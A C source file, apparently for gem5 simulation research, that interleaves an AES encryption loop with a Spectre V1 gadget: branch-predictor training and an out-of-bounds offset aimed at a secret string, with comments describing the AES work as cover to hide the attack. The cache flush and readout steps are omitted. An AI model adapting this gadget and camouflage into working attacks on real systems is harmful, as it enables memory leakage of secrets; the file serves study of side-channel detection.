#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include "aes.h"

// ==========================================
// PART 1: SPECTRE V1 GADGET
// ==========================================
unsigned int array1_size = 16;
uint8_t unused1[64]; // Padding to prevent cache hits from adjacent memory
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64]; // Padding
uint8_t array2[256 * 512];

char *secret = "DefaultSecret"; // This pointer will be changed by argv[1]
uint8_t temp = 0;

// The "Gadget" - The vulnerable function
void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}

// ==========================================
// PART 2: BENIGN WORKLOAD (AES)
// ==========================================
// This function mimics normal system activity to hide the attack
void run_aes_workload() {
    uint8_t key[16] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c };
    uint8_t in[16]  = { 0x6b, 0xc1, 0xbe, 0xe2, 0x2e, 0x40, 0x9f, 0x96, 0xe9, 0x3d, 0x7e, 0x11, 0x73, 0x93, 0x17, 0x2a };
    struct AES_ctx ctx;

    AES_init_ctx(&ctx, key);

    // Run a short burst of encryption
    for(int i=0; i<50; i++) {
        AES_ECB_encrypt(&ctx, in);
    }
}

// ==========================================
// PART 3: MAIN (INFUSION)
// ==========================================
int main(int argc, char **argv) {
    // 1. Setup the Secret
    if (argc > 1) {
        secret = argv[1];
    }
    size_t secret_len = strlen(secret);

    // Calculate where the secret is relative to array1
    // (Spectre exploits this offset to read out-of-bounds)
    size_t malicious_x = (size_t)(secret - (char*)array1);

    printf("Starting AES + Spectre V1 Infusion...\n");
    printf("Target Secret: %s\n", secret);
    printf("Offset: %ld\n", malicious_x);

    // Initialize array2 to ensure it is in memory
    for (int i = 0; i < sizeof(array2); i++) {
        array2[i] = 1;
    }

    // 2. The Attack Loop (Scanning the secret byte by byte)
    for (int i = 0; i < secret_len; i++) {

        // --- A. BENIGN NOISE ---
        // Run the benign workload to "infuse" the malicious behavior with normal activity
        run_aes_workload();

        // --- B. SPECTRE ATTACK SEQUENCE ---

        // Step 1: Flush array2 from cache (Simulated here conceptually)
        // In a real attack, you would use `_mm_clflush` or an eviction set.
        // For gem5 simulation, the access pattern itself generates the stats we need.

        // Step 2: Train the Branch Predictor
        // We call the victim function with valid inputs (0..15) multiple times
        // to train the CPU to expect "True" for the (x < array1_size) check.
        for (int train = 0; train < 10; train++) {
            victim_function(train % array1_size);
        }

        // Step 3: The Exploit
        // We call it with the malicious offset. The CPU predicts "True" and
        // speculatively accesses array2[secret_byte * 512].
        // Even though it eventually realizes x is too big and reverts,
        // the cache line for that secret byte is now loaded.
        victim_function(malicious_x + i);
    }

    // Prevent compiler from optimizing out the results
    printf("Used temp: %d\n", temp);
    printf("Done.\n");
    return 0;
}
